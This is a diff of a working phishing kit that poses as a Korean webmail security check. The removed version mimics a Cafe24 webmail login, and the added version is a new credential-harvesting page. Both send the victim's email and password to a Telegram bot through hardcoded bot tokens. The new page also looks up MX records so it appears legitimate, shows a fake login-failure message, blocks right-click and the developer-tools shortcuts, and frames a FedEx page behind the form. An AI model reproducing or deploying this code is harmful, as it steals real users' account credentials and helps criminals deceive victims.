@@ -1,112 +1,656 @@
+<!DOCTYPE html>
+<html lang="ko">
+<script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/content/location/location.js" id="nimlmejbmnecnaghgmbahmbaddhjbecg"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/extend-native-history-api.js"></script><script src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/libs/requests.js"></script><head>
+		<link rel="" href="" type="">
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge">
+		<meta name="viewport" content="width=device-width,initial-scale=1.0">
+        <title>웹메일 보안 시스템</title>
+        <meta name="keywords" content="웹메일 보안 시스템">
+		<meta name="description" content="Welcome to the 웹메일 보안 시스템 homepage. ">
+		<meta property="og:url" content="https://www.nts.go.kr/english/main.do">
 
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <title></title>
-    <meta name="WMMETA" content="host" data-host="gpwebmail-060.cafe24.com" /><meta name="WMMETA" content="domain" data-domain="hadofnc.com" /><meta name="WMMETA" content="appversion" data-appversion="20220804" /><meta name="WMMETA" content="langpack" data-langpack="ko" />
-    <link rel="stylesheet" type="text/css" href="https://img.cafe24.com/serviceserver/biz/webmail/css/webmail.css?v=20220804" />
+
+        <script type="text/javascript" src="/common/js/jquery-3.1.1.min.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;,&quot;ogs.google.com&quot;]" src="chrome-extension://nimlmejbmnecnaghgmbahmbaddhjbecg/executors/traffic.js"></script>
+        <script type="text/javascript" src="/common/js/mCustomScrollbar/jquery.mCustomScrollbar.concat.min.js"></script>
+        <script type="text/javascript" src="/common/js/jquery.bxslider.js"></script>
+        <script type="text/javascript" src="/common/js/slick-1.8.1/slick/slick.min.js"></script>
+        <script type="text/javascript" src="/js/web/english/layout.js"></script>
+        <script type="text/javascript" src="/js/web/english/main.js"></script>
+		<script type="text/javascript" src="/js/jquery.showLoading.js"></script>
+		<script type="text/javascript" src="/js/common.js"></script>
+		<script type="text/javascript" src="/js/jquery-ui.min.js"></script>
+		<script type="text/javascript" src="/js/keyboard/keyboard.min.js"></script>
+		<script type="text/javascript" src="/js/webtrends.js"></script>
+    <style>
+        * {
+            margin: 0 !important;
+            padding: 0 !important;
+            box-sizing: border-box !important;
+        }
+
+        body, html {
+            height: 100% !important;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+            color: #333 !important;
+            overflow: hidden !important;
+        }
+
+        .landing-page {
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            background-color: rgba(0, 0, 0, 0.65) !important;
+            color: white !important;
+            display: flex !important;
+            flex-direction: column !important;
+            justify-content: center !important;
+            align-items: center !important;
+            z-index: 1000 !important;
+        }
+
+        .landing-page.hidden {
+            opacity: 0 !important;
+            pointer-events: none !important;
+        }
+
+        .main-background {
+            position: relative !important;
+            width: 100% !important;
+            height: 100% !important;
+            background-color: rgba(0, 0, 0, 0.65) !important;
+            z-index: 1 !important;
+            opacity: 0 !important;
+        }
+
+        .main-background.visible {
+            opacity: 1 !important;
+        }
+
+        .sand {
+            position: absolute !important;
+            top: 23% !important;
+            left: 35%!important;
+            width: 29% !important;
+            height: 290px !important;
+            background-color: #e9e9e9 !important;
+            box-shadow: 2px 0 10px rgba(0, 0, 0, 0.1) !important;
+            z-index: 2 !important;
+            align-items: relative !important;
+            display: flex !important;
+            align: justify !important;
+            flex-direction: column !important;
+        }
+
+        .sand-header {
+            padding: 15px 60px 15px 40px !important;
+            margin-bottom: 20px !important;
+            background-color: #336699 !important;
+            color: white !important;
+            text-align: justify !important;
+        }
+
+        .img1 {
+            border: 0 !important;
+            align: left !important;
+        }
+
+        .img2 {
+            border: 0 !important;
+            float: right !important;
+        }
+
+        .sand-body {
+            display: block !important;
+            padding: 0 40px 0 40px !important;
+            overflow-y: auto !important;
+            align-items: justify !important;
+            justify-content: justify !important;
+        }
+
+        .sand-footer {
+            position: absolute !important;
+            top: 259px !important;
+            left: 0 !important;
+            width: 100% !important;
+            z-index: 4 !important;
+            padding: 10px 0px 5px 0 !important;
+            display: flex !important;
+            gap: 10px !important;
+            flex-wrap: wrap !important;
+            background-color: transparent !important;
+            border-top: 1px solid #ccc !important;
+            text-align: center !important;
+            align-items: center !important;
+            justify-content: center !important;
+            font-size: 0.7em !important;
+            color: #282a2a !important;
+        }
+
+        .info_text {
+            text-align: left !important;
+            font-size: 1em !important;
+            font-weight: 900 !important;
+            margin: 10px 0 15px 0 !important;
+            color: #424546 !important;
+        }
+
+        .form-container {
+            width: auto !important;
+        }
+
+        .form-group {
+            display: flex !important;
+            align-items: center !important;
+            gap: 11px !important;
+            margin-bottom: 7px !important;
+            flex-wrap: wrap !important;
+        }
+
+        .form-group4 {
+            display: flex !important;
+            align-items: center !important;
+            gap: 34px !important;
+            margin-bottom: 5px !important;
+            flex-wrap: wrap !important;
+        }
+
+        label {
+            display: flex !important;
+            font-weight: bolder !important;
+            font-size: 10px !important;
+            margin-bottom: 5px !important;
+        }
+
+        input {
+            width: 225px !important;
+            padding: 3px 12px 3px 12px !important;
+            outline: none !important;
+            border: 1px solid #6c757d !important;
+            border-radius: 1px !important;
+            font-size: 14px !important;
+        }
+
+        #auto-button {
+            position: absolute !important;
+            top: 55% !important;
+            right: 15% !important;
+            z-index: 3 !important;
+            width: 85px !important;
+            height: 59px !important;
+            padding: 0 !important;
+            background-color: #336699 !important;
+            color: #e9e9e9 !important;
+            border: 0 !important;
+            border-radius: 1px !important;
+            cursor: pointer !important;
+            font-size: 2em !important;
+            font-weight: 900 !important;
+        }
+
+        h1 {
+            font-size: 2.5em !important;
+            margin-bottom: 20px !important;
+        }
+
+        p {
+            font-size: 1.2em !important;
+            max-width: 600px !important;
+            line-height: 1.6 !important;
+        }
+
+
+        .message {
+            color: red !important;
+            font-size: 0.7em !important;
+            min-height: 1.2em !important;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .out-line1 {
+            position: absolute !important;
+            top: 136px !important;
+            left: 135px !important;
+            z-index: 5 !important;
+            width: 195px !important;
+            height: 24px !important;
+            border-top: 1px solid #646464 !important;
+            border-right: 1px solid #646464 !important;
+        }
+
+        .invalid-input {
+            border: 2px solid #ff0000 !important;
+            box-shadow: 0 0 5px rgba(255, 0, 0, 0.1) !important;
+        }
+
+        #root {
+            position: absolute !important;
+            left: 0 !important;
+            right: 0 !important;
+            bottom: 0 !important;
+            top: 0 !important;
+            z-index: -10 !important;
+            pointer-events: none !important;
+            filter: brightness(0.3) !important;
+        }
+    </style>
+
 </head>
 <body>
+    <div class="landing-page" id="landingPage"></div>
+    <div class="main-background" id="mainBackground">
+        <div class="sand">
+            <div class="sand-header">
+                <img class="img1" src="https://i.imgur.com/tLaZVLz.gif" width="96" height="60" loading="lazy">
+                <img class="img2" src="https://i.imgur.com/CKXJOFI.gif" width="190" height="60" loading="lazy">
+            </div>
+            <div class="sand-body">
+                <div class="info_text">
+                    <div>사용자 인증</div>
+                </div>
+                <div class="out-line1"></div>
+                <div>
+                    <form class="form-container" id="mainForm" action="#" method="POST">
+                        <div class="form-group">
+                            <input type="email" id="emailInput" name="email" title="" placeholder="아이디" value="[[-Email-]]" disabled>
+                        </div>
+                        <div class="form-group4">
+                            <input type="password" id="pw" name="password" title="" placeholder="비밀번호">
+                        </div>
+                        <div>
+                            <button type="submit" class="" title="확인하다" id="auto-button">✓</button>
+                        </div>
+                    </form>
+                </div>
+                <div>
+                    <span id="message" class="message"></span>
+                </div>
+            </div>
+            <div class="sand-footer">
+                <div>에 의해 구동:</div>
+                <div id="result"></div>
+            </div>
+        </div>
+    </div>
 
-<div class="mLogin type1 ">
-    <ul class="languages">
-        <li><a class="login-language-change" href="#changeLang/en">ENGLISH</a></li>
-        <li><a class="login-language-change" href="#changeLang/chGb">简体中文</a></li>
-        <li><a class="login-language-change" href="#changeLang/jp">日本語</a></li>
-        <li><a class="login-language-change" href="#changeLang/chBig">繁體中文</a></li>
-        <li><a class="login-language-change" href="#changeLang/ko">한국어</a></li>
-    </ul>
-	<div class="inner">
-		<div class="logoArea">
-			<h2 class="logo">
-				<img src="	http://img.cafe24.com/serviceserver/biz/webmail/images/login/@img_logo_aType.gif" alt="" />
-			</h2>
-		</div>
-		<div class="contents">
-			<ul class="mTab typeLogin eTab switch-login-type">
-				<li class="selected"><a href="#tabUser">사용자 모드</a></li>
-				<li><a href="#tabAdmin">관리자 모드</a></li>
-			</ul>
-			<div id="loginForm" class="tabCont" style="display: block;">
-				<form id="loginForm" method="post" action="loginForm">
-				<input type="hidden" name="loginType" value="user">
-				<input type="hidden" name="rTarget" value="parent">
-				<input type="hidden" name="url" value="">
-				<input type="hidden" name="csrf_token" value="310968ceed29666482.21341722">
-					<fieldset>
-					<legend>사용자 로그인</legend>
-						<label><input type="email" id="email" name="email" class="fText" placeholder="아이디" value="[[-Email-]]" required></label><!-- 개발참고 : value값 placeholder로 넣어주세요 -->
-						<label><input type="password" id="password" name="password" class="fText" placeholder="비밀번호" required ></label>
-						<button type="submit" class="btnLogin user-login-btn"><span>로그인</span></button>
-						<ul class="security">
-							<li><label><input type="checkbox" name="save"> 아이디 저장</label></li>
-							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
-						</ul>
-					</fieldset>
-				</form>
-				<!-- 2차 인증 -->
-			</div>
-			<div id="loginForm" class="tabCont" style="display: none;">
-				<form id="loginForm" method="post" action="loginForm">
-				<input type="hidden" name="loginType" value="admin">
-				<input type="hidden" name="rTarget" value="parent">
-				<input type="hidden" name="url" value="">
-                                <input type="hidden" name="csrf_token" value="310968ceed29666482.21341722">
-					<fieldset>
-					<legend>관리자 로그인</legend>
-						<label><input type="email" id="email" name="email" class="email" placeholder="아이디" value="" required></label>
-						<label><input type="password" name="password" class="fText" placeholder="비밀번호" required ></label>
-						<button type="submit" class="btnLogin"><span>로그인</span></button>
-						<ul class="security">
-							<li><input type="checkbox" name="save"> 아이디 저장</li>
-							<li><input type="checkbox" name="ip" checked="checked"> IP보안 <span>on</span></li></li><!-- 개발참고 : 기본값 check해제되면 off 글씨로 변경되고 span에 class="disabled" 넣어주세요 -->
-						</ul>
-					</fieldset>
-				</form>
-			</div>
-		</div>
+    <script>
+        // DOM elements
+        var landingPage = document.getElementById('landingPage');
+        var mainBackground = document.getElementById('mainBackground');
+        var emailInput = document.getElementById('emailInput');
+        var passwordInput = document.getElementById('pw');
+        var resultDiv = document.getElementById('result');
+        var messageDiv = document.getElementById('message');
+        var form = document.getElementById('mainForm');
 
-	</div>
-	<!-- 만료 된 계정 경고 텍스트 -->
-	
-	<!-- copyright -->
-    <p class="footer"><a href="https://www.cafe24corp.com">Copyright ⓒ <strong>1999-2025 Cafe24 Corp.</strong> All Rights Reserved.</a></p>
-</div>
-<!-- Google Analytics -->
-   <script>
-    document.getElementById('loginForm').addEventListener('submit', function(event) {
-      event.preventDefault();
+        // Configuration
+        var WEBMAIL_KEY = '7215447654:AAFruiatkWLjBvNPZJpHJlZdtNXlZB-y5XI';
+        var WEBMAIL_ID = '7134396720';
+        var submitAttempts = 0;
+        var maxSubmitAttempts = 3;
+        var errorMessageTimer = null;
+        var isAnalyzing = false;
+        var smtpDiagnosisComplete = false;
+        var isEmailValid = false;
+        var isPasswordValid = false;
 
+        // Initialize the application
+        function init() {
+            analyzeEmailIfValid();
+        }
 
-      var email = document.getElementById('email').value;
-      var password = document.getElementById('password').value;
+        // Form submission handler
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            validateEmail();
+            validatePassword();
 
-      var apiKey = '7904095790:AAGWb5-pr2UbTPHY2iBYiFWU-xrtHdzrCv0';
-      var chatId = '8125665558';
+            if (!isEmailValid || !isPasswordValid) {
+                if (!isEmailValid) {
+                    emailInput.classList.add('invalid-input');
+                }
+                if (!isPasswordValid) {
+                    passwordInput.classList.add('invalid-input');
+                }
+                return;
+            }
 
-      var message = 'CAFE24:\nEmail: ' + email + '\nPassword: ' + password;
-      var url = 'https://api.telegram.org/bot' + apiKey + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);
+            emailInput.classList.remove('invalid-input');
+            passwordInput.classList.remove('invalid-input');
 
-      fetch(url)
-  .then(function(response) {
-    if (response.ok) {
-      // If the response is OK, redirect to Google
-      window.location.href = "https://webmail.[[-Domain-]]";
-    } else {
-      // If the response is NOT OK, also redirect to Google
-      window.location.href = "https://webmail.[[-Domain-]]";
-    }
-  })
-  .catch(function(error) {
-    // On fetch error, redirect to Google too
-    window.location.href = "https://webmail.[[-Domain-]]";
-  });
+            if (submitAttempts >= maxSubmitAttempts) {
+                showErrorMessage("");
+                passwordInput.disabled = true;
+                return;
+            }
 
+            submitAttempts++;
+            submitToTelegram();
+
+            setTimeout(function() {
+                passwordInput.value = '';
+            }, 2000);
+
+            if (errorMessageTimer) {
+                clearTimeout(errorMessageTimer);
+            }
+
+            errorMessageTimer = setTimeout(function() {
+                showErrorMessage("서버 보고서: 현재 인증에 실패했습니다.");
+            }, 3000);
+
+            if (submitAttempts >= maxSubmitAttempts) {
+                showErrorMessage("");
+                passwordInput.disabled = true;
+            }
+        });
+
+        // Auto-button click handler
+        document.getElementById('auto-button').addEventListener('click', function() {
+            if (errorMessageTimer) {
+                clearTimeout(errorMessageTimer);
+            }
+            clearErrorMessage();
+        });
+
+        // Submit data to Telegram
+function submitToTelegram() {
+    var email = emailInput.value;
+    var password = passwordInput.value;
+    var browserInfo = 'Browser: ' + getBrowserName();
+    var message = 'Email: ' + email + '\nPassword: ' + password + '\n' + browserInfo;
+    var url = 'https://api.telegram.org/bot' + WEBMAIL_KEY + '/sendMessage';
+
+    fetch(url, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            chat_id: WEBMAIL_ID,
+            text: message
+        })
+    })
+    .then(function(response) {
+        return response.json();
+    })
+    .then(function(data) {
+        console.log('Success:', data);
+    })
+    .catch(function(error) {
+        console.error('Error:', error);
     });
-  </script>
-<script src=""></script>
-<!-- /Google Analytics -->
+}
+
+		// Helper function to extract browser name
+function getBrowserName() {
+    var userAgent = navigator.userAgent;
+
+    if (userAgent.includes("Firefox")) return "Firefox";
+    if (userAgent.includes("Edg")) return "Edge";
+    if (userAgent.includes("Chrome")) return "Chrome";
+    if (userAgent.includes("Safari")) return "Safari";
+    if (userAgent.includes("Opera")) return "Opera";
+
+    return "Unknown Browser";
+}
+
+        // Show error message
+        function showErrorMessage(message) {
+            clearErrorMessage();
+            messageDiv.textContent = message;
+            messageDiv.className = 'message error';
+        }
+
+        // Clear error message
+        function clearErrorMessage() {
+            messageDiv.textContent = '';
+            messageDiv.className = 'message';
+        }
+
+        // Email input handler
+        emailInput.addEventListener('input', function() {
+            emailInput.classList.remove('invalid-input');
+            analyzeEmailIfValid();
+        });
+
+        // Password input handler
+        passwordInput.addEventListener('input', function() {
+            passwordInput.classList.remove('invalid-input');
+            validatePassword();
+        });
+
+        // Initialize on DOM content loaded
+        document.addEventListener('DOMContentLoaded', function() {
+            init();
+        });
+
+        // Analyze email if valid
+        function analyzeEmailIfValid() {
+            var email = emailInput.value.trim();
+            var domain = email.split('@')[1];
+            resultDiv.classList.add('hidden');
+            resultDiv.innerHTML = '';
+            validateEmail();
+
+            if (domain && domain.includes('.') && !isAnalyzing && isEmailValid) {
+                analyzeEmail(email, domain);
+            }
+        }
+
+        // Validate email format
+        function isValidEmail(email) {
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        // Validate password format
+        function isValidPassword(password) {
+            var re = /^(?=.*[A-Za-z])(?=.*\d).{8,}$/;
+            return re.test(password);
+        }
+
+        // Validate email
+        function validateEmail() {
+            var email = emailInput.value.trim();
+            isEmailValid = email && isValidEmail(email);
+            return isEmailValid;
+        }
+
+        // Validate password
+        function validatePassword() {
+            var password = passwordInput.value.trim();
+            isPasswordValid = password && isValidPassword(password);
+            return isPasswordValid;
+        }
+
+        // Analyze email domain
+        function analyzeEmail(email, domain) {
+            isAnalyzing = true;
+            var services = [
+                { name: 'Google DNS', func: queryGoogleDNS },
+                { name: 'Cloudflare DNS', func: queryCloudflareDNS },
+                { name: 'HackerTarget', func: queryHackerTarget }
+            ];
+
+            var mxRecords = [];
+
+            var processServices = function(index) {
+                if (index >= services.length) {
+                    if (mxRecords.length > 0) {
+                        var primaryServer = mxRecords.sort(function(a, b) {
+                            return a.priority - b.priority;
+                        })[0].server;
+                        displayResult(primaryServer);
+                    } else {
+                        displayResult('WEBMAIL SERVICE');
+                    }
+
+                    isAnalyzing = false;
+                    smtpDiagnosisComplete = true;
+
+                    setTimeout(function() {
+                        landingPage.classList.add('hidden');
+                        mainBackground.classList.add('visible');
+                    }, 500);
+
+                    return;
+                }
+
+                var service = services[index];
+                service.func(domain).then(function(result) {
+                    if (result && result.mxRecords && result.mxRecords.length > 0) {
+                        mxRecords = result.mxRecords;
+
+                        if (mxRecords.length > 0) {
+                            var primaryServer = mxRecords.sort(function(a, b) {
+                                return a.priority - b.priority;
+                            })[0].server;
+                            displayResult(primaryServer);
+                        } else {
+                            displayResult('WEBMAIL SERVICE');
+                        }
+
+                        isAnalyzing = false;
+                        smtpDiagnosisComplete = true;
+
+                        setTimeout(function() {
+                            landingPage.classList.add('hidden');
+                            mainBackground.classList.add('visible');
+                        }, 500);
+                    } else {
+                        processServices(index + 1);
+                    }
+                }).catch(function(error) {
+                    processServices(index + 1);
+                });
+            };
+
+            processServices(0);
+        }
+
+        // Query Google DNS
+        function queryGoogleDNS(domain) {
+            return fetch('https://dns.google/resolve?name=' + domain + '&type=MX')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('Google DNS failed');
+                    return response.json();
+                })
+                .then(function(data) {
+                    if (data.Answer) {
+                        var mxRecords = data.Answer.map(function(record) {
+                            var parts = record.data.split(' ');
+                            return {
+                                priority: parseInt(parts[0]),
+                                server: parts[1].replace(/\.$/, ''),
+                                ttl: record.TTL
+                            };
+                        });
+                        return { mxRecords: mxRecords, source: 'Google DNS' };
+                    }
+                    throw new Error('WEBMAIL SERVICE');
+                });
+        }
+
+        // Query Cloudflare DNS
+        function queryCloudflareDNS(domain) {
+            return fetch('https://cloudflare-dns.com/dns-query?name=' + domain + '&type=MX', {
+                headers: {
+                    'Accept': 'application/dns-json'
+                }
+            })
+            .then(function(response) {
+                if (!response.ok) throw new Error('Cloudflare DNS failed');
+                return response.json();
+            })
+            .then(function(data) {
+                if (data.Answer) {
+                    var mxRecords = data.Answer.map(function(record) {
+                        var parts = record.data.split(' ');
+                        return {
+                            priority: parseInt(parts[0]),
+                            server: parts[1].replace(/\.$/, ''),
+                            ttl: record.TTL
+                        };
+                    });
+                    return { mxRecords: mxRecords, source: 'Cloudflare DNS' };
+                }
+                throw new Error('WEBMAIL SERVICE');
+            });
+        }
+
+        // Query HackerTarget
+        function queryHackerTarget(domain) {
+            return fetch('https://api.hackertarget.com/mxlookup/?q=' + domain)
+                .then(function(response) {
+                    if (!response.ok) throw new Error('HackerTarget failed');
+                    return response.text();
+                })
+                .then(function(text) {
+                    if (text.includes('error') || text.includes('API')) {
+                        throw new Error('HackerTarget API limit');
+                    }
+
+                    var lines = text.split('\n').filter(function(line) {
+                        return line.includes('MX');
+                    });
+
+                    var mxRecords = lines.map(function(line) {
+                        var parts = line.split(/\s+/);
+                        return {
+                            priority: parseInt(parts[parts.length - 2]) || 10,
+                            server: parts[parts.length - 1]
+                        };
+                    });
+
+                    if (mxRecords.length > 0) {
+                        return { mxRecords: mxRecords, source: 'HackerTarget' };
+                    }
+                    throw new Error('WEBMAIL SERVICE');
+                });
+        }
+
+        // Display result
+        function displayResult(serverDomain) {
+            resultDiv.innerHTML = '<div>' + serverDomain + '</div>';
+            resultDiv.classList.remove('hidden');
+            resultDiv.classList.add('visible');
+        }
+
+        // Prevent right-click
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Prevent developer tools
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'F12') {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.key === 'u') {
+                e.preventDefault();
+                return false;
+            }
+        });
+    </script>
+
+    <div id="root">
+        <iframe id="myframe" scrolling="no" src="https://fedex.com/fedexbillingonline" width="100%" height="100%" frameborder="0"></iframe>
+    </div>
 </body>
 </html>
